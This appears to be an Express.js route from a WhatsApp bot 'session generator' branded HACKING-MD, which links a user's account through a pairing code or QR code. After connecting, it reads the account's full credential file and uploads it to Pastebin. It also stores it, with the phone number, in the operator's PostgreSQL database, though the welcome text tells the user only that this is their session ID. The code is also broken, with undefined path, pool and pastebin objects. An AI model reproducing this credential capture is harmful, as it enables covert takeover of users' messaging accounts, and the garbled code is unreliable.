const express = require('express');
const router = express.Router();
const { default: makeWASocket, useMultiFileAuthState, delay } = require('@whiskeysockets/baileys');
const { default: makeWASocketMaher } = require('maher-zubair-baileys');
const pino = require('pino');
const fs = require('fs-extra');
const qrcode = require('qrcode');
const phoneNumber = require('awesome-phonenumber');

const WELCOME_MESSAGE = `
╔════◇
║ 『 BIENVENUE CHEZ HACKING-MD』
║ besion d'aide contacter le support du numéro suivant.
╚════════════════════════╝
╔═════◇
║  『••• AIDE HACKING-MD •••』
║ Ytube: https://youtube.com/@KouameDjakiss?si=k2HqPPSmHBZe3ABd
║ Owner: https://wa.me/2250507607226
║ Note: VOICI LA SESSION_ID VEILLEZ REMERCIE THOMAS
║ HACKING-MD VEILLEZ NOUS  ENCOURAGER AVEC  DES FORK
╚════════════════════════╝
`;

async function validatePhoneNumber(number) {
    const pn = phoneNumber(number);
    return pn.isValid();
}

router.get('/', async (req, res) => {
    const { mode, number } = req.query;
    const sessionId = Date.now().toString();
    const tempPath = path.join(__dirname, '../temp', sessionId);

    try {
        await fs.ensureDir(tempPath);
        const { state, saveCreds } = await useMultiFileAuthState(tempPath);

        const sock = mode === 'maher' ? 
            makeWASocketMaher({ auth: state }) : 
            makeWASocket({
                auth: state,
                printQRInTerminal: false,
                logger: pino({ level: "silent" })
            });

        if (mode === 'pair') {
            if (!number || !await validatePhoneNumber(number)) {
                return res.status(400).json({ 
                    status: false, 
                    error: "Numéro de téléphone invalide" 
                });
            }

            try {
                const code = await sock.requestPairingCode(number);
                // Enregistrement dans PostgreSQL
                await pool.query(
                    'INSERT INTO connections (phone_number, connection_type) VALUES ($1, $2)',
                    [number, 'pair']
                );
                res.json({ status: true, code });
            } catch (error) {
                res.status(500).json({ 
                    status: false, 
                    error: "Erreur lors de la génération du code" 
                });
            }
        }

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;

            if (qr && mode === 'qr') {
                try {
                    const qrImage = await qrcode.toDataURL(qr);
                    if (!res.headersSent) {
                        res.type('image/png').send(Buffer.from(qrImage.split(',')[1], 'base64'));
                    }
                } catch (error) {
                    console.error('Erreur QR:', error);
                }
            }

            if (connection === 'open') {
                const creds = fs.readFileSync(path.join(tempPath, 'creds.json'));
                const sessionData = Buffer.from(creds).toString('base64');

                // Sauvegarde sur Pastebin
                try {
                    const pasteUrl = await pastebin.createPaste({
                        text: sessionData,
                        title: `WhatsApp Session - ${sock.user.id}`,
                        format: 'text',
                        privacy: 1
                    });
                    console.log('Session sauvegardée sur Pastebin:', pasteUrl);
                } catch (error) {
                    console.error('Erreur Pastebin:', error);
                }

                // Envoi du message de bienvenue
                await sock.sendMessage(sock.user.id, { text: sessionData });
                await sock.sendMessage(sock.user.id, { text: WELCOME_MESSAGE });

                // Mise à jour PostgreSQL
                await pool.query(
                    'UPDATE connections SET status = $1, session_id = $2 WHERE phone_number = $3',
                    ['active', sessionData, sock.user.id.split('@')[0]]
                );

                await delay(1000);
                await sock.logout();
                await fs.remove(tempPath);
            }

            if (connection === 'close') {
                await fs.remove(tempPath);
                if (!res.headersSent) {
                    res.json({ status: false, error: "Connexion fermée" });
                }
            }
        });

        sock.ev.on('creds.update', saveCreds);

    } catch (error) {
        console.error('Erreur:', error);
        await fs.remove(tempPath);
        if (!res.headersSent) {
            res.status(500).json({ status: false, error: "Erreur du service" });
        }
    }
});

module.exports = router;
